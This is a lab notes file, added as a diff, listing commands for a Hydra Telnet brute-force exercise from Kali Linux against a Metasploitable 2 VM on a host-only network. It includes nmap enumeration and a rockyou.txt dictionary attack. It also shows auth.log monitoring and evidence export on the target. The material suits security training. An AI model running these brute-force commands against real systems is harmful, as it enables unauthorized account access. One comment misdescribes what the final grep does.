@@ -1,0 +1,112 @@
+=========================================================
+Hydra Telnet Brute Force Simulation — Commands Used
+Environment: Kali Linux ↔ Metasploitable 2
+Network: VirtualBox Host-Only
+=========================================================
+
+########################
+# KALI LINUX — ATTACKER
+########################
+
+# Verificación inicial de conectividad
+
+ping 192.168.56.101
+
+Checks basic network reachability between the attacker machine and the target host.
+
+
+
+# Enumeración de servicios expuestos
+
+nmap -sV -A 192.168.56.101
+
+Performs service discovery, version detection and basic enumeration
+against the Metasploitable 2 target.
+
+
+
+# Ataque Telnet con credencial conocida (validación inicial)
+
+hydra -V -t 4 -l msfadmin -p msfadmin telnet://192.168.56.101
+
+Hydra authentication test using a known username/password pair.
+
+Flags:
+-V     Verbose mode (shows every authentication attempt)
+-t 4   Four concurrent tasks/threads
+-l     Single username
+-p     Single password
+
+
+
+# Simulación de Brute Force por diccionario
+
+hydra -V -t 4 \
+-l msfadmin \
+-P /usr/share/wordlists/rockyou.txt \
+telnet://192.168.56.101
+
+Dictionary-based brute force attack against the Telnet service. #rockyou.txt en -P es un archivo de la maquina de Kali Linux que cuenta con un respositorio de posibles contraseñas, también hay otro para -l "Usuarios" top-usernames-shortlist.txt
+
+Flags:
+-V     Verbose output (Muestra los intentos)
+-t 4   Concurrent attack threads
+-l     Fixed username (msfadmin) # también lista
+-P     Password wordlist (RockYou)
+telnet:// Target service and IP
+
+Wordlist used:
+rockyou.txt
+
+Common password dataset frequently used for security testing
+and credential attack simulations.
+
+
+
+###############################
+# METASPLOITABLE 2 — TARGET
+###############################
+
+# Monitoreo de logs en tiempo real
+
+tail -f /var/log/auth.log
+
+Displays authentication log activity live while Hydra is running.
+
+Useful to observe:
+
+- failed authentication attempts
+- repeated source IPs
+- successful logins
+- authentication frequency
+
+
+
+# Visualización del archivo completo de logs
+
+less /var/log/auth.log
+
+Opens the full authentication log for navigation and inspection.
+
+Navigation:
+SPACE  → next page
+b      → previous page
+/      → search
+q      → quit
+
+
+
+# Revisión rápida de eventos recientes, en este caso los últimos 200 intentos de login
+
+tail -200 /var/log/auth.log
+
+Shows the last 200 log entries.
+
+
+
+# Exportación de evidencia relevante
+
+grep -i "login\|fail\|authentication\|telnet" /var/log/auth.log > ~/hydra_telnet.log #pasaje del archivo auth.log donde están todos los intentos, a solo los últimos 200 en un archivo llamado hydra_telnet.log
+
+Filters authentication-related events and saves them
+into a dedicated evidence file for later analysis/documentation.
